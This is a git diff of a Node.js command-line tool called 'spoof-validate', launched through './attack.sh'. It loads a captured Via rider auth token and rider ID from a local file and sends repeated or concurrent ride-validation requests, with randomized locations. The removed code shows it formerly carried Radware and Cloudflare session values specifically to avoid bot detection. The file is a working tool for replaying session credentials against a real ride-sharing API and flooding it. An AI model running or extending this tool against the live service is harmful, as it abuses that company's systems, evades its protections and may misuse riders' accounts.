@@ -1,27 +1,14 @@
 #!/usr/bin/env node
 /**
- * CLI for spoof-validate. Loads .env, parses args, resolves credentials (env or --capture), calls sendValidate.
- * Usage: node cli.js [--once] [--loop N] [--interval MS] [--concurrent N] [--capture FILE] [--index N]
+ * CLI for spoof-validate. Reads credentials from repo-root via_credentials.json, calls sendValidate.
+ * Run from repo root: ./attack.sh [--once] [--loop N] [--interval MS] [--concurrent N]
  */
 
 const path = require("path");
 const fs = require("fs");
 const { sendValidate } = require("./spoof-validate.js");
 
-function loadEnv() {
-  const envPath = path.join(__dirname, ".env");
-  try {
-    for (const line of fs.readFileSync(envPath, "utf8").split("\n")) {
-      const trimmed = line.trim();
-      if (!trimmed || trimmed.startsWith("#")) continue;
-      const eq = trimmed.indexOf("=");
-      if (eq === -1) continue;
-      const key = trimmed.slice(0, eq).trim();
-      const value = trimmed.slice(eq + 1).trim();
-      if (key && !process.env[key]) process.env[key] = value;
-    }
-  } catch (_) {}
-}
+const CREDENTIALS_PATH = path.join(process.cwd(), "via_credentials.json");
 
 function uuid4() {
   return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (c) => {
@@ -31,40 +18,44 @@ function uuid4() {
   });
 }
 
-function loadCapture(filePath, index = 0) {
-  const p = path.isAbsolute(filePath) ? filePath : path.join(process.cwd(), filePath);
-  const data = JSON.parse(fs.readFileSync(p, "utf8"));
-  const list = Array.isArray(data) ? data : [data];
-  const entry = list[index];
-  if (!entry || !entry.body) throw new Error("No body in capture entry at index " + index);
-  const auth = entry.headers?.authorization || entry.body?.whos_asking?.auth_token;
-  const riderId = entry.body?.whos_asking?.id;
-  if (!auth || riderId == null) throw new Error("Capture must have authorization and whos_asking.id");
-  const o = entry.body?.prescheduled_recurring_series_details?.origin;
-  const d = entry.body?.prescheduled_recurring_series_details?.destination;
+function loadCredentials() {
+  let data;
+  try {
+    data = JSON.parse(fs.readFileSync(CREDENTIALS_PATH, "utf8"));
+  } catch (e) {
+    throw new Error(
+      `Missing or invalid ${CREDENTIALS_PATH}. Run ./investigate.sh, book a ride, or copy via_credentials.json.example to via_credentials.json and fill.`
+    );
+  }
+  const authToken = data.auth_token;
+  const riderId = data.rider_id != null ? parseInt(data.rider_id, 10) : null;
+  if (!authToken || riderId == null) {
+    throw new Error("via_credentials.json must have auth_token and rider_id");
+  }
+  const o = data.origin && data.origin.lat != null ? data.origin : null;
+  const d = data.destination && data.destination.lat != null ? data.destination : null;
   return {
-    authToken: auth,
+    authToken,
     riderId,
-    rbzid: entry.headers?.rbzid ?? null,
-    cookie: entry.headers?.cookie ?? null,
-    deviceId: entry.body?.client_details?.client_spec?.device_id ?? uuid4(),
-    origin: o ? { geocoded_addr: o.geocoded_addr, full_geocoded_addr: o.full_geocoded_addr, lat: o.latlng?.lat, lng: o.latlng?.lng } : null,
-    destination: d ? { geocoded_addr: d.geocoded_addr, full_geocoded_addr: d.full_geocoded_addr, lat: d.latlng?.lat, lng: d.latlng?.lng } : null,
+    deviceId: uuid4(),
+    origin: o,
+    destination: d,
   };
 }
 
 function parseArgs() {
   const args = process.argv.slice(2);
-  const out = { once: true, loop: 1, interval: 2000, capture: null, index: 0, concurrent: null };
+  const out = { once: false, loop: 4, interval: 2000, concurrent: null, randomizeRequests: false };
   for (let i = 0; i < args.length; i++) {
-    if (args[i] === "--once") out.once = true;
-    else if (args[i] === "--loop" && args[i + 1] != null) { out.loop = parseInt(args[++i], 10) || 1; out.once = false; }
-    else if (args[i] === "--interval" && args[i + 1] != null) out.interval = parseInt(args[++i], 10) || 1000;
+    if (args[i] === "--once") { out.once = true; out.loop = 1; }
+    else if (args[i] === "--loop" && args[i + 1] != null) {
+      out.loop = parseInt(args[++i], 10) || 1;
+      out.once = false;
+    } else if (args[i] === "--interval" && args[i + 1] != null) out.interval = parseInt(args[++i], 10) || 1000;
     else if (args[i] === "--concurrent" && args[i + 1] != null && /^\d+$/.test(args[i + 1])) {
       out.concurrent = parseInt(args[++i], 10);
       out.once = false;
-    } else if (args[i] === "--capture" && args[i + 1] != null) out.capture = args[++i];
-    else if (args[i] === "--index" && args[i + 1] != null) out.index = parseInt(args[++i], 10) || 0;
+    } else if (args[i] === "--randomize-requests") out.randomizeRequests = true;
   }
   return out;
 }
@@ -74,61 +65,42 @@ function log(label, value) {
 }
 
 async function main() {
-  loadEnv();
   const args = parseArgs();
-
-  let authToken = process.env.VIA_AUTH_TOKEN;
-  let riderId = process.env.VIA_RIDER_ID != null ? parseInt(process.env.VIA_RIDER_ID, 10) : null;
-  let rbzid = process.env.VIA_RBZID || null;
-  let cookie = process.env.VIA_COOKIE || null;
-  let deviceId = process.env.VIA_DEVICE_ID || uuid4();
-  let origin = null;
-  let destination = null;
-  let credentialSource = "env (.env or process.env)";
-
-  if (args.capture) {
-    const cap = loadCapture(args.capture, args.index);
-    authToken = cap.authToken;
-    riderId = cap.riderId;
-    rbzid = cap.rbzid ?? rbzid;
-    cookie = cap.cookie ?? cookie;
-    deviceId = cap.deviceId ?? deviceId;
-    origin = cap.origin;
-    destination = cap.destination;
-    credentialSource = `capture file (index ${args.index})`;
-  }
-
-  if (!authToken || riderId == null) {
-    console.error("Missing credentials. Set VIA_AUTH_TOKEN and VIA_RIDER_ID, or use --capture <via_validate_calls.json>");
-    process.exit(1);
-  }
+  const creds = loadCredentials();
 
   const n = args.concurrent != null ? args.concurrent : (args.once ? 1 : Math.max(1, args.loop));
+  const randomizeLocations =
+    args.randomizeRequests || !(creds.origin && creds.destination && creds.origin.lat != null && creds.destination.lat != null);
 
-  console.log("Credentials & session-bound headers");
-  log("source", credentialSource);
-  log("rider_id", riderId);
-  log("device_id", deviceId);
-  log("auth_token", authToken ? `${authToken.slice(0, 20)}...` : "(missing)");
-  log("rbzid (Radware)", rbzid ? `${rbzid.slice(0, 8)}...` : "(not set — may trigger bot detection)");
-  log("cookie (Cloudflare)", cookie ? `set, ${cookie.length} chars` : "(not set — may trigger bot detection)");
+  console.log("Credentials (from via_credentials.json)");
+  log("rider_id", creds.riderId);
+  log("auth_token", creds.authToken ? `${creds.authToken.slice(0, 20)}...` : "(missing)");
+  log("locations", randomizeLocations ? "random per request" : "from creds");
   if (args.concurrent != null) log("mode", `${n} concurrent`);
+  console.log("");
+  console.log(`Sending ${n} request${n === 1 ? "" : "s"}...`);
   console.log("");
 
   const results = await sendValidate({
-    authToken,
-    riderId,
-    deviceId,
-    rbzid,
-    cookie,
-    origin,
-    destination,
+    authToken: creds.authToken,
+    riderId: creds.riderId,
+    deviceId: creds.deviceId,
+    origin: creds.origin,
+    destination: creds.destination,
+    randomizeLocations,
     count: args.concurrent == null ? n : undefined,
     intervalMs: args.interval,
     concurrent: args.concurrent != null ? n : undefined,
     dumpDir: __dirname,
+    onProgress: (i, total, result, locations) => {
+      const proposals = (result.body && result.body.proposals) || [];
+      const okStr = result.ok ? "ok" : "fail";
+      const locStr = locations ? ` ${locations.origin} → ${locations.destination}` : "";
+      console.log(`[${i}/${total}] request done: ${result.status} ${okStr}${proposals.length ? ` proposals=${proposals.length}` : ""}${locStr}`);
+    },
   });
 
+  console.log("");
   results.forEach((result, i) => {
     console.log(`[${i + 1}/${n}] Response`);
     log("status", result.status);
@@ -137,7 +109,8 @@ async function main() {
       const proposals = result.body.proposals ?? [];
       log("proposals_count", proposals.length);
       if (result.body.header_text) log("header_text", result.body.header_text);
-      if (result.body.unavailable_providers?.length) log("unavailable_providers", result.body.unavailable_providers.join(", "));
+      if (result.body.unavailable_providers?.length)
+        log("unavailable_providers", result.body.unavailable_providers.join(", "));
       if (proposals.length && proposals[0].ride_info?.price) log("first_proposal_price", proposals[0].ride_info.price);
     }
     if (!result.ok) log("raw_preview", result.raw?.slice(0, 300) ?? "(empty)");
